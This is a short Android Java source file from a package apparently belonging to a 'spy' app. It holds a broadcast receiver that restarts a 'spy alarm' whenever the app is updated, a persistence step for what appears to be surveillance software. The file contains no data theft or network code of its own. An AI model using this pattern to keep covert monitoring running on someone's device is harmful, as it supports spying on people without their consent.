package com.gameofcoding.spy.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import com.gameofcoding.spy.spys.SpyStarter;
import com.gameofcoding.spy.utils.XLog;

/**
 * Received when app gets updated
*/
public class AppUpdateReceiver extends BroadcastReceiver {
    private static final String TAG = "AppUpdateReceiver";
    
    @Override
    public void onReceive(Context context, Intent intent) {
	if(intent.getAction().equals(Intent.ACTION_MY_PACKAGE_REPLACED)) {
	    XLog.i(TAG, "App updated, restarting spy alarm");
	    new SpyStarter(context).start();
	} else { XLog.w(TAG, "Unknown broadcast, " + intent.toString()); }
    }
}
